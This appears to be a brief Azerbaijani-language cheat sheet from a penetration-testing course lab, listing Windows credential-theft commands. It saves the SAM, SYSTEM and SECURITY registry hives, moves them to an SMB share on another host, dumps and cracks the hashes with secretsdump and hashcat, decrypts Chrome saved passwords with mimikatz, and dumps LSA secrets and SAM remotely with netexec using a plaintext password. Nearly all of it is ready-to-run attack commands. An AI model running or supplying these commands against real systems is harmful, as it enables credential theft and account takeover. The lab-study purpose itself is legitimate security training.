1) SAM,SYSTEM ve SECURITY fayllarini export etmek ucun

```shell
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

2) Windows'dan Linux'a SMB folderin'e fayl atmaq
```shell
move sam.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
```

3) SAM, SYSTEM ve SECURITY fayllarini dump etmek ucun
```shell
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
4) hemin tapilan hash'leri crack etmek ucun lazim olan hashcat modulu
```shell
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
5) DCC2 hashes
```shell
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```
7) DPAPI
```shell
mimikatz.exe
dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```
7) Dumping LSA secrets remotely
```shell
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
9) Dumping SAM Remotely
```shell
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```



